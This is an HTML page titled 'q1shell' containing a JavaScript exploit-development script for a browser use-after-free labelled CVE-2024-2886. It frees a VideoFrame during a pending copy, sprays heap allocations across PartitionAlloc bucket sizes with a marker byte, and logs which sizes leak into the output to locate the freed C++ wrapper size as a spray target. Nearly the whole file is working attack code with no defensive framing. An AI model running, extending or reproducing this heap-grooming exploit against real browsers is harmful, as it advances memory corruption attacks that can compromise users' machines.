<!doctype html>
<html>
<head><title>q1shell</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px;">
<div id="out"></div>
<script>
const log = s => { out.innerHTML += s + '<br>'; console.log(s); };

async function pwn() {
    log('CVE-2024-2886 — C++ wrapper size oracle');
    log('Finding freed VideoFrame wrapper size via spray sizes');
    log('');

    const canvas = new OffscreenCanvas(64, 64);
    const gl = canvas.getContext('webgl');

    // Helper: does spray of given size affect the UAF output?
    async function testSpraySize(spraySize, fillByte) {
        gl.clearColor(1.0, 0.0, 0.0, 1.0);
        gl.clear(gl.COLOR_BUFFER_BIT);
        gl.finish();

        const frame = new VideoFrame(canvas, { timestamp: performance.now() });
        const buf = new Uint8Array(frame.allocationSize());
        const p = frame.copyTo(buf);
        frame.close();

        // Spray with specific size
        const spray = [];
        for (let i = 0; i < 200; i++) {
            const s = new Uint8Array(spraySize);
            s.fill(fillByte);
            spray.push(s);
        }

        await p;
        spray.length = 0;

        // Check if fillByte appears in output
        const hit = buf.some(b => b === fillByte);
        return hit;
    }

    // Baseline: what bytes do we normally get?
    gl.clearColor(1.0, 0.0, 0.0, 1.0);
    gl.clear(gl.COLOR_BUFFER_BIT);
    gl.finish();
    const frameB = new VideoFrame(canvas, { timestamp: 0 });
    const bufB = new Uint8Array(frameB.allocationSize());
    await frameB.copyTo(bufB);
    frameB.close();
    log('[baseline] size=' + bufB.length + ' first8: ' +
        Array.from(bufB.slice(0,8)).map(x=>x.toString(16).padStart(2,'0')).join(' '));

    // The baseline bytes - we're looking for our spray byte 0xDD to appear
    // 0xDD should not naturally appear in red frame data
    const FILL = 0xDD;
    if (bufB.some(b => b === FILL)) {
        log('[!] 0xDD naturally in baseline - picking different byte');
    }

    log('');
    log('Testing spray sizes (looking for 0xDD in output):');

    // Try common PartitionAlloc bucket sizes
    // Chrome's PartitionAlloc uses sizes: 32, 64, 128, 192, 256, 320, 384, 448, 512,
    // 576, 640, 704, 768, 832, 896, 960, 1024, 1152, 1280, 1408, 1536...
    const sizes = [32, 48, 64, 80, 96, 112, 128, 160, 192, 224, 256,
                   320, 384, 448, 512, 576, 640, 704, 768, 832, 896,
                   960, 1024, 1088, 1152, 1280, 1408, 1536, 1664, 1792, 2048];

    const hits = [];
    for (const sz of sizes) {
        const hit = await testSpraySize(sz, FILL);
        log('  size=' + sz + ': ' + (hit ? 'HIT 0xDD FOUND' : 'miss'));
        if (hit) hits.push(sz);
        await new Promise(r => setTimeout(r, 50)); // small delay between tests
    }

    log('');
    if (hits.length > 0) {
        log('HIT sizes: ' + hits.join(', '));
        log('Smallest hit = likely freed C++ wrapper size: ' + Math.min(...hits));
        log('This is our spray target allocation size');
    } else {
        log('No hits - spray not reaching freed C++ object');
        log('May need larger spray count or different approach');
    }
}

pwn();
</script>
</body>
</html>
